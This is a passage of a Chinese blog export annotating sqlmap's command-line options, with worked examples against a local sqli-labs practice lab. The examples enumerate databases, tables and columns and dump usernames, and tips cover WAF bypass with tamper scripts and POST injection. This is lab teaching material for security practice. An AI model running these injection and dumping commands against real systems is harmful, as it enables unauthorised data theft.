DBA</br>\n\t检测是不是dba，就是root权限咯</br>\n--users             Enumerate DBMS users</br>\n\t枚举数据库用户</br>\n--passwords         Enumerate DBMS users password hashes</br>\n\t枚举数据库用户的哈希值</br>\n--privileges        Enumerate DBMS users privileges</br>\n\t枚举数据库用户的权限</br>\n--roles             Enumerate DBMS users roles</br>\n\t枚举数据库用户的角色</br>\n--dbs               Enumerate DBMS databases</br>\n\t枚举数据库有哪些</br>\n--tables            Enumerate DBMS database tables</br>\n\t枚举数据表名</br>\n--columns           Enumerate DBMS database table columns</br>\n\t枚举列名</br>\n--schema            Enumerate DBMS schema</br>\n\t这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举</br>\n--count             Retrieve number of entries for table(s)</br>\n\t枚举表格个数</br>\n--dump              Dump DBMS database table entries</br>\n\t输出数据库表的数据</br>\n--dump-all          Dump all DBMS databases tables entries</br>\n\t输出所有</br>\n--search            Search column(s), table(s) and/or database name(s)</br>\n\t查找特定的列名，表名或数据库名，配合下面的-D,-C,-T</br>\n--comments          Retrieve DBMS comments</br>\n\t枚举数据库的注释</br>\n-D DB               DBMS database to enumerate</br>\n\t指定数据库名</br>\n-T TBL              DBMS database table(s) to enumerate</br>\n\t指定表名</br>\n-C COL              DBMS database table column(s) to enumerate</br>\n\t指定列名</br>\n-X EXCLUDECOL       DBMS database table column(s) to not enumerate</br>\n\t指定不枚举那个列</br>\n-U USER             DBMS user to enumerate</br>\n\t枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数</br>\n--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</br>\n\t枚举时排除系统的数据库</br>\n--pivot-column=P..  Pivot column name</br>\n\t以某一列为核心？这个用过没感觉出什么用</br>\n--where=DUMPWHERE   Use WHERE condition while table dumping</br>\n\t使用where调试限制table的输出</br>\n--start=LIMITSTART  First query output entry to retrieve</br>\n\t指定开始从第几行开始输出，如--start=3，前两行就不输出了</br>\n--stop=LIMITSTOP    Last query output entry to retrieve</br>\n\t指定从第几行开始停止输出</br>\n--first=FIRSTCHAR   First query output word character to retrieve</br>\n\t指定只输出第几个字符开始输出，盲注才有效，亲测</br>\n--last=LASTCHAR     Last query output word character to retrieve</br>\n\t指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，</br>\n\t如 ：--first 3 --last 5  只输出3到5位置的字符</br>\n--sql-query=QUERY   SQL statement to be executed</br>\n\t指定执行我们的sql语句</br>\n--sql-shell         Prompt for an interactive SQL shell</br>\n\t返回一个sql的shell</br>\n--sql-file=SQLFILE  Execute SQL statements from given file(s)</br>\n\t从文件中读取执行sql语句</br>\n\n## 二.实例\n\t1.sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -b --is-dba --dbs\n\t查看指纹信息/是否dba(root权限)/数据库\n\tweb server operating system: Linux Ubuntu\n\tweb application technology: Apache 2.4.18\n\tback-end DBMS operating system: Linux Ubuntu\n\tback-end DBMS: MySQL 5.0\n\tbanner:    '5.7.23-0ubuntu0.16.04.1'\n\n\tcurrent user is DBA:    True\n\n\tavailable databases [6]:\n\t[*] challenges\n\t[*] information_schema\n\t[*] mysql\n\t[*] performance_schema\n\t[*] security\n\t[*] sys\n\n\t2.查看security下表名\n\t sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security --tables\n\tDatabase: security\n\t[4 tables]\n\t+----------+\n\t| emails   |\n\t| referers |\n\t| uagents  |\n\t| users    |\n\t+----------+\n\n\t3.查看列名\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users --columns\n\n\tDatabase: security\n\tTable: users\n\t[3 columns]\n\t+----------+-------------+\n\t| Column   | Type        |\n\t+----------+-------------+\n\t| id       | int(3)      |\n\t| password | varchar(20) |\n\t| username | varchar(20) |\n\t+----------+-------------+\n\n\t4.获得所有username\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users -C username --dump\n\n\tDatabase: security\n\tTable: users\n\t[16 entries]\n\t+-----------+\n\t| username  |\n\t+-----------+\n\t| admin     |\n\t| admin#    |\n\t| admin'#   |\n\t| admin1    |\n\t| admin2    |\n\t| admin3    |\n\t| admin4    |\n\t| admin\\\\'# |\n\t| Angelina  |\n\t| batman    |\n\t| dhakkan   |\n\t| Dumb      |\n\t| Dummy     |\n\t| secure    |\n\t| stupid    |\n\t| superman  |\n\t+-----------+\n\n### 三.技巧等\n\t1.自动寻找注入点\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-62/?id=1*\" --batch\n\t如上，在可能的注入点后，加上*，将会自动寻找注入\n\t可以加上 --level n（1-5） 参数，越高越全面\n\n\t2.绕过WAF\n\t--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n\t3.post注入\n\t--data \"id=1\"\n\t或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n","source":"_posts/security/sql/sqlmap.md","raw":"---\ntitle: sqlmap\ndate: 2018-08-28 15:30:54\ntags: [sql注入]\n---\n使用sqlmap需要自己先找到注入点\n## 1.sqlmap 用户文档\n用户文档来自 https://blog.csdn.net/u012763794/article/details/52638931</br>\n-v VERBOSE 输出信息的详细程度\n\t# Verbosity level.\n\t# Valid: integer between 0 and 6\n\t# 0: Show only error and critical messages  只显示错误和关键信息\n\t# 1: Show also warning and info messages    警告和信息\n\t# 2: Show also debug messages               调试信息\n\t# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)',(..)\"(\"\n\t# 4: Show also HTTP requests                整个GET报文都看到了\n\t# 5: Show also HTTP responses' headers         返回报文的头部\n\t# 6: Show also HTTP responses' page content    返回的html代码都有了\n\t# Default: 1\n Request: 请求\n\tThese options can be used to specify how to connect to the target URL\n\n\t--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n\t\t指定HTTP请求的方法，GET，POST，PUT，MOVE等\n\t--data=DATA         Data string to be sent through POST\n\t\t指定POST的参数\n\t--param-del=PARA..  Character used for splitting parameter values\n\t\t这个拆分一些参数的，如下面用;拆分post参数\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"query=foobar;id=1\" --param-del=\";\" -f --banner --dbs --users\n\t--cookie=COOKIE     HTTP Cookie header value\n\t\t指定cookie值\n\t--cookie-del=COO..  Character used for splitting cookie values\n\t\t指定分割cookie值的字符是什么\n\t--load-cookies=L..  File containing cookies in Netscape/wget format\n\t\t这个是从文件中读取cookie吧，Netscape/wget格式的\n\t--drop-set-cookie   Ignore Set-Cookie header from response\n\t\t忽略响应包的Set-Cookie头\n\t--user-agent=AGENT  HTTP User-Agent header value\n\t\t指定User-Agent用户代理\n\t--random-agent      Use randomly selected HTTP User-Agent header value\n\t\t随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n\t--host=HOST         HTTP Host header value\n\t\t指定主机头\n\t--referer=REFERER   HTTP Referer header value\n\t\t指定Referer头，就是请求来源的意思\n\t-H HEADER, --hea..  Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n\t\t指定某个头部，如： -H \"X-Forwarded-For: 127.0.0.1\"\n\t--headers=HEADERS   Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\")\n\t\t这个的话应该是可以指定多个，用\\n分割\n\t--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n\t\t指定http认证类型\n\t--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n\t\t指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n\t--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n\t\t指定一个私钥文件来认证\n\t--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n\t\t忽略401错误\n\t--proxy=PROXY       Use a proxy to connect to the target URL\n\t\t指定代理\n\t--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n\t\t指定代理的认证信息，就是账号密码\n\t--proxy-file=PRO..  Load proxy list from a file\n\t\t从文件中选择代理\n\t--ignore-proxy      Ignore system default proxy settings\n\t\t忽略系统默认代理\n\t--tor               Use Tor anonymity network\n\t\t使用tor网络\n\t--tor-port=TORPORT  Set Tor proxy port other than default\n\t\t设置tor的端口，如果不是默认端口的话\n\t--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n\t\t设置tor代理的类型\n\t--check-tor         Check to see if Tor is used properly\n\t\t检测tor能不能用\n\t--delay=DELAY       Delay in seconds between each HTTP request\n\t\t设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n\t--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n\t\t设置超时时间，默认30秒\n\t--retries=RETRIES   Retries when the connection timeouts (default 3)\n\t\t设置重试的次数，默认3次\n\t--randomize=RPARAM  Randomly change value for given parameter(s)\n\t\t随机地更改给定参数的值\n\t--safe-url=SAFEURL  URL address to visit frequently during testing\n\t\t有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n\t\t这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n\t--safe-post=SAFE..  POST data to send to a safe URL\n\t\t这里设置一个正确的post数据\n\t--safe-req=SAFER..  Load safe HTTP request from a file\n\t\t从文件中读取安全，或者叫正确的http请求\n\t--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n\t\t设置访问安全url的时间间隔\n\t--skip-urlencode    Skip URL encoding of payload data\n\t\t不进行url编码\n\t--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n\t\t设置CSRF的token\n\t--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n\t--force-ssl         Force usage of SSL/HTTPS\n\t\t强制使用https\n\t--hpp               Use HTTP parameter pollution method\n\t\t尝试了一下，只能用于ASP，得到报错信息如下：\n\t\t[WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n\t--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n\t\t\t\t\t\t\"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n\t\t发送请求之前，先运行这段python代码，比如对某个参数进行处理\n\t\t比如下面的，hash参数就是id的md5值\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc\n    509a6f75849b\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\"\n\nFingerprint:</br>\n-f, --fingerprint   Perform an extensive DBMS version fingerprint\n\t这个应该是数据库指纹识别，加了可能识别更好</br>\n\nEnumeration:</br>\nThese options can be used to enumerate the back-end database\nmanagement system information, structure and data contained in the\ntables. Moreover you can run your own SQL statements</br>\n-a, --all           Retrieve everything</br>\n\t检索所有，这是拖库的节奏啊</br>\n-b, --banner        Retrieve DBMS banner</br>\n\t检索数据库的一些标志性的信息，就是指纹这样子吧</br>\n--current-user      Retrieve DBMS current user</br>\n\t检索当前连接数据库的用户</br>\n--current-db        Retrieve DBMS current database</br>\n\t检索当前连接的数据库</br>\n--hostname          Retrieve DBMS server hostname</br\n\t检索服务器的主机名</br>\n--is-dba            Detect if the DBMS current user is DBA</br>\n\t检测是不是dba，就是root权限咯</br>\n--users             Enumerate DBMS users</br>\n\t枚举数据库用户</br>\n--passwords         Enumerate DBMS users password hashes</br>\n\t枚举数据库用户的哈希值</br>\n--privileges        Enumerate DBMS users privileges</br>\n\t枚举数据库用户的权限</br>\n--roles             Enumerate DBMS users roles</br>\n\t枚举数据库用户的角色</br>\n--dbs               Enumerate DBMS databases</br>\n\t枚举数据库有哪些</br>\n--tables            Enumerate DBMS database tables</br>\n\t枚举数据表名</br>\n--columns           Enumerate DBMS database table columns</br>\n\t枚举列名</br>\n--schema            Enumerate DBMS schema</br>\n\t这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举</br>\n--count             Retrieve number of entries for table(s)</br>\n\t枚举表格个数</br>\n--dump              Dump DBMS database table entries</br>\n\t输出数据库表的数据</br>\n--dump-all          Dump all DBMS databases tables entries</br>\n\t输出所有</br>\n--search            Search column(s), table(s) and/or database name(s)</br>\n\t查找特定的列名，表名或数据库名，配合下面的-D,-C,-T</br>\n--comments          Retrieve DBMS comments</br>\n\t枚举数据库的注释</br>\n-D DB               DBMS database to enumerate</br>\n\t指定数据库名</br>\n-T TBL              DBMS database table(s) to enumerate</br>\n\t指定表名</br>\n-C COL              DBMS database table column(s) to enumerate</br>\n\t指定列名</br>\n-X EXCLUDECOL       DBMS database table column(s) to not enumerate</br>\n\t指定不枚举那个列</br>\n-U USER             DBMS user to enumerate</br>\n\t枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数</br>\n--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</br>\n\t枚举时排除系统的数据库</br>\n--pivot-column=P..  Pivot column name</br>\n\t以某一列为核心？这个用过没感觉出什么用</br>\n--where=DUMPWHERE   Use WHERE condition while table dumping</br>\n\t使用where调试限制table的输出</br>\n--start=LIMITSTART  First query output entry to retrieve</br>\n\t指定开始从第几行开始输出，如--start=3，前两行就不输出了</br>\n--stop=LIMITSTOP    Last query output entry to retrieve</br>\n\t指定从第几行开始停止输出</br>\n--first=FIRSTCHAR   First query output word character to retrieve</br>\n\t指定只输出第几个字符开始输出，盲注才有效，亲测</br>\n--last=LASTCHAR     Last query output word character to retrieve</br>\n\t指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，</br>\n\t如 ：--first 3 --last 5  只输出3到5位置的字符</br>\n--sql-query=QUERY   SQL statement to be executed</br>\n\t指定执行我们的sql语句</br>\n--sql-shell         Prompt for an interactive SQL shell</br>\n\t返回一个sql的shell</br>\n--sql-file=SQLFILE  Execute SQL statements from given file(s)</br>\n\t从文件中读取执行sql语句</br>\n\n## 二.实例\n\t1.sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -b --is-dba --dbs\n\t查看指纹信息/是否dba(root权限)/数据库\n\tweb server operating system: Linux Ubuntu\n\tweb application technology: Apache 2.4.18\n\tback-end DBMS operating system: Linux Ubuntu\n\tback-end DBMS: MySQL 5.0\n\tbanner:    '5.7.23-0ubuntu0.16.04.1'\n\n\tcurrent user is DBA:    True\n\n\tavailable databases [6]:\n\t[*] challenges\n\t[*] information_schema\n\t[*] mysql\n\t[*] performance_schema\n\t[*] security\n\t[*] sys\n\n\t2.查看security下表名\n\t sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security --tables\n\tDatabase: security\n\t[4 tables]\n\t+----------+\n\t| emails   |\n\t| referers |\n\t| uagents  |\n\t| users    |\n\t+----------+\n\n\t3.查看列名\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users --columns\n\n\tDatabase: security\n\tTable: users\n\t[3 columns]\n\t+----------+-------------+\n\t| Column   | Type        |\n\t+----------+-------------+\n\t| id       | int(3)      |\n\t| password | varchar(20) |\n\t| username | varchar(20) |\n\t+----------+-------------+\n\n\t4.获得所有username\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users -C username --dump\n\n\tDatabase: security\n\tTable: users\n\t[16 entries]\n\t+-----------+\n\t| username  |\n\t+-----------+\n\t| admin     |\n\t| admin#    |\n\t| admin'#   |\n\t| admin1    |\n\t| admin2    |\n\t| admin3    |\n\t| admin4    |\n\t| admin\\\\'# |\n\t| Angelina  |\n\t| batman    |\n\t| dhakkan   |\n\t| Dumb      |\n\t| Dummy     |\n\t| secure    |\n\t| stupid    |\n\t| superman  |\n\t+-----------+\n\n### 三.技巧等\n\t1.自动寻找注入点\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-62/?id=1*\" --batch\n\t如上，在可能的注入点后，加上*，将会自动寻找注入\n\t可以加上 --level n（1-5） 参数，越高越全面\n\n\t2.绕过WAF\n\t--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n\t3.post注入\n\t--data \"id=1\"\n\t或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n","slug":"security/sql/sqlmap","published":1,"updated":"2018-09-29T07:11:40.476Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr640546002e6cvpnrtj42hy","content":"<p>使用sqlmap需要自己先找到注入点</p>\n<h2 id=\"1-sqlmap-用户文档\"><a href=\"#1-sqlmap-用户文档\" class=\"headerlink\" title=\"1.sqlmap 用户文档\"></a>1.sqlmap 用户文档</h2><p>用户文档来自 <a href=\"https://blog.csdn.net/u012763794/article/details/52638931\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/u012763794/article/details/52638931</a><br><br>-v VERBOSE 输出信息的详细程度</p>\n<pre><code># Verbosity level.\n# Valid: integer between 0 and 6\n# 0: Show only error and critical messages  只显示错误和关键信息\n# 1: Show also warning and info messages    警告和信息\n# 2: Show also debug messages               调试信息\n# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&apos;,(..)&quot;(&quot;\n# 4: Show also HTTP requests                整个GET报文都看到了\n# 5: Show also HTTP responses&apos; headers         返回报文的头部\n# 6: Show also HTTP responses&apos; page content    返回的html代码都有了\n# Default: 1\n</code></pre><p> Request: 请求<br>    These options can be used to specify how to connect to the target URL</p>\n<pre><code>--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n    指定HTTP请求的方法，GET，POST，PUT，MOVE等\n--data=DATA         Data string to be sent through POST\n    指定POST的参数\n--param-del=PARA..  Character used for splitting parameter values\n    这个拆分一些参数的，如下面用;拆分post参数\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users\n--cookie=COOKIE     HTTP Cookie header value\n    指定cookie值\n--cookie-del=COO..  Character used for splitting cookie values\n    指定分割cookie值的字符是什么\n--load-cookies=L..  File containing cookies in Netscape/wget format\n    这个是从文件中读取cookie吧，Netscape/wget格式的\n--drop-set-cookie   Ignore Set-Cookie header from response\n    忽略响应包的Set-Cookie头\n--user-agent=AGENT  HTTP User-Agent header value\n    指定User-Agent用户代理\n--random-agent      Use randomly selected HTTP User-Agent header value\n    随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n--host=HOST         HTTP Host header value\n    指定主机头\n--referer=REFERER   HTTP Referer header value\n    指定Referer头，就是请求来源的意思\n-H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)\n    指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;\n--headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)\n    这个的话应该是可以指定多个，用\\n分割\n--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n    指定http认证类型\n--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n    指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n    指定一个私钥文件来认证\n--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n    忽略401错误\n--proxy=PROXY       Use a proxy to connect to the target URL\n    指定代理\n--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n    指定代理的认证信息，就是账号密码\n--proxy-file=PRO..  Load proxy list from a file\n    从文件中选择代理\n--ignore-proxy      Ignore system default proxy settings\n    忽略系统默认代理\n--tor               Use Tor anonymity network\n    使用tor网络\n--tor-port=TORPORT  Set Tor proxy port other than default\n    设置tor的端口，如果不是默认端口的话\n--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n    设置tor代理的类型\n--check-tor         Check to see if Tor is used properly\n    检测tor能不能用\n--delay=DELAY       Delay in seconds between each HTTP request\n    设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n    设置超时时间，默认30秒\n--retries=RETRIES   Retries when the connection timeouts (default 3)\n    设置重试的次数，默认3次\n--randomize=RPARAM  Randomly change value for given parameter(s)\n    随机地更改给定参数的值\n--safe-url=SAFEURL  URL address to visit frequently during testing\n    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n    这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n--safe-post=SAFE..  POST data to send to a safe URL\n    这里设置一个正确的post数据\n--safe-req=SAFER..  Load safe HTTP request from a file\n    从文件中读取安全，或者叫正确的http请求\n--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n    设置访问安全url的时间间隔\n--skip-urlencode    Skip URL encoding of payload data\n    不进行url编码\n--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n    设置CSRF的token\n--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n--force-ssl         Force usage of SSL/HTTPS\n    强制使用https\n--hpp               Use HTTP parameter pollution method\n    尝试了一下，只能用于ASP，得到报错信息如下：\n    [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)\n    发送请求之前，先运行这段python代码，比如对某个参数进行处理\n    比如下面的，hash参数就是id的md5值\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc\n509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;\n</code></pre><p>Fingerprint:<br><br>-f, –fingerprint   Perform an extensive DBMS version fingerprint<br>    这个应该是数据库指纹识别，加了可能识别更好<br></p>\n<p>Enumeration:<br><br>These options can be used to enumerate the back-end database<br>management system information, structure and data contained in the<br>tables. Moreover you can run your own SQL statements<br><br>-a, –all           Retrieve everything<br><br>    检索所有，这是拖库的节奏啊<br><br>-b, –banner        Retrieve DBMS banner<br><br>    检索数据库的一些标志性的信息，就是指纹这样子吧<br><br>–current-user      Retrieve DBMS current user<br><br>    检索当前连接数据库的用户<br><br>–current-db        Retrieve DBMS current database<br><br>    检索当前连接的数据库<br><br>–hostname          Retrieve DBMS server hostname&lt;/br<br>    检索服务器的主机名<br><br>–is-dba            Detect if the DBMS current user is DBA<br><br>    检测是不是dba，就是root权限咯<br><br>–users             Enumerate DBMS users<br><br>    枚举数据库用户<br><br>–passwords         Enumerate DBMS users password hashes<br><br>    枚举数据库用户的哈希值<br><br>–privileges        Enumerate DBMS users privileges<br><br>    枚举数据库用户的权限<br><br>–roles             Enumerate DBMS users roles<br><br>    枚举数据库用户的角色<br><br>–dbs               Enumerate DBMS databases<br><br>    枚举数据库有哪些<br><br>–tables            Enumerate DBMS database tables<br><br>    枚举数据表名<br><br>–columns           Enumerate DBMS database table columns<br><br>    枚举列名<br><br>–schema            Enumerate DBMS schema<br><br>    这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举<br><br>–count             Retrieve number of entries for table(s)<br><br>    枚举表格个数<br><br>–dump              Dump DBMS database table entries<br><br>    输出数据库表的数据<br><br>–dump-all          Dump all DBMS databases tables entries<br><br>    输出所有<br><br>–search            Search column(s), table(s) and/or database name(s)<br><br>    查找特定的列名，表名或数据库名，配合下面的-D,-C,-T<br><br>–comments          Retrieve DBMS comments<br><br>    枚举数据库的注释<br><br>-D DB               DBMS database to enumerate<br><br>    指定数据库名<br><br>-T TBL              DBMS database table(s) to enumerate<br><br>    指定表名<br><br>-C COL              DBMS database table column(s) to enumerate<br><br>    指定列名<br><br>-X EXCLUDECOL       DBMS database table column(s) to not enumerate<br><br>    指定不枚举那个列<br><br>-U USER             DBMS user to enumerate<br><br>    枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数<br><br>–exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br><br>    枚举时排除系统的数据库<br><br>–pivot-column=P..  Pivot column name<br><br>    以某一列为核心？这个用过没感觉出什么用<br><br>–where=DUMPWHERE   Use WHERE condition while table dumping<br><br>    使用where调试限制table的输出<br><br>–start=LIMITSTART  First query output entry to retrieve<br><br>    指定开始从第几行开始输出，如–start=3，前两行就不输出了<br><br>–stop=LIMITSTOP    Last query output entry to retrieve<br><br>    指定从第几行开始停止输出<br><br>–first=FIRSTCHAR   First query output word character to retrieve<br><br>    指定只输出第几个字符开始输出，盲注才有效，亲测<br><br>–last=LASTCHAR     Last query output word character to retrieve<br><br>    指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，<br><br>    如 ：–first 3 –last 5  只输出3到5位置的字符<br><br>–sql-query=QUERY   SQL statement to be executed<br><br>    指定执行我们的sql语句<br><br>–sql-shell         Prompt for an interactive SQL shell<br><br>    返回一个sql的shell<br><br>–sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>    从文件中读取执行sql语句<br></p>\n<h2 id=\"二-实例\"><a href=\"#二-实例\" class=\"headerlink\" title=\"二.实例\"></a>二.实例</h2><pre><code>1.sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -b --is-dba --dbs\n查看指纹信息/是否dba(root权限)/数据库\nweb server operating system: Linux Ubuntu\nweb application technology: Apache 2.4.18\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL 5.0\nbanner:    &apos;5.7.23-0ubuntu0.16.04.1&apos;\n\ncurrent user is DBA:    True\n\navailable databases [6]:\n[*] challenges\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] security\n[*] sys\n\n2.查看security下表名\n sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security --tables\nDatabase: security\n[4 tables]\n+----------+\n| emails   |\n| referers |\n| uagents  |\n| users    |\n+----------+\n\n3.查看列名\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns\n\nDatabase: security\nTable: users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int(3)      |\n| password | varchar(20) |\n| username | varchar(20) |\n+----------+-------------+\n\n4.获得所有username\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump\n\nDatabase: security\nTable: users\n[16 entries]\n+-----------+\n| username  |\n+-----------+\n| admin     |\n| admin#    |\n| admin&apos;#   |\n| admin1    |\n| admin2    |\n| admin3    |\n| admin4    |\n| admin\\\\&apos;# |\n| Angelina  |\n| batman    |\n| dhakkan   |\n| Dumb      |\n| Dummy     |\n| secure    |\n| stupid    |\n| superman  |\n+-----------+\n</code></pre><h3 id=\"三-技巧等\"><a href=\"#三-技巧等\" class=\"headerlink\" title=\"三.技巧等\"></a>三.技巧等</h3><pre><code>1.自动寻找注入点\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch\n如上，在可能的注入点后，加上*，将会自动寻找注入\n可以加上 --level n（1-5） 参数，越高越全面\n\n2.绕过WAF\n--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n3.post注入\n--data &quot;id=1&quot;\n或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>使用sqlmap需要自己先找到注入点</p>\n<h2 id=\"1-sqlmap-用户文档\"><a href=\"#1-sqlmap-用户文档\" class=\"headerlink\" title=\"1.sqlmap 用户文档\"></a>1.sqlmap 用户文档</h2><p>用户文档来自 <a href=\"https://blog.csdn.net/u012763794/article/details/52638931\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/u012763794/article/details/52638931</a><br><br>-v VERBOSE 输出信息的详细程度</p>\n<pre><code># Verbosity level.\n# Valid: integer between 0 and 6\n# 0: Show only error and critical messages  只显示错误和关键信息\n# 1: Show also warning and info messages    警告和信息\n# 2: Show also debug messages               调试信息\n# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&apos;,(..)&quot;(&quot;\n# 4: Show also HTTP requests                整个GET报文都看到了\n# 5: Show also HTTP responses&apos; headers         返回报文的头部\n# 6: Show also HTTP responses&apos; page content    返回的html代码都有了\n# Default: 1\n</code></pre><p> Request: 请求<br>    These options can be used to specify how to connect to the target URL</p>\n<pre><code>--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n    指定HTTP请求的方法，GET，POST，PUT，MOVE等\n--data=DATA         Data string to be sent through POST\n    指定POST的参数\n--param-del=PARA..  Character used for splitting parameter values\n    这个拆分一些参数的，如下面用;拆分post参数\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users\n--cookie=COOKIE     HTTP Cookie header value\n    指定cookie值\n--cookie-del=COO..  Character used for splitting cookie values\n    指定分割cookie值的字符是什么\n--load-cookies=L..  File containing cookies in Netscape/wget format\n    这个是从文件中读取cookie吧，Netscape/wget格式的\n--drop-set-cookie   Ignore Set-Cookie header from response\n    忽略响应包的Set-Cookie头\n--user-agent=AGENT  HTTP User-Agent header value\n    指定User-Agent用户代理\n--random-agent      Use randomly selected HTTP User-Agent header value\n    随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n--host=HOST         HTTP Host header value\n    指定主机头\n--referer=REFERER   HTTP Referer header value\n    指定Referer头，就是请求来源的意思\n-H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)\n    指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;\n--headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)\n    这个的话应该是可以指定多个，用\\n分割\n--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or 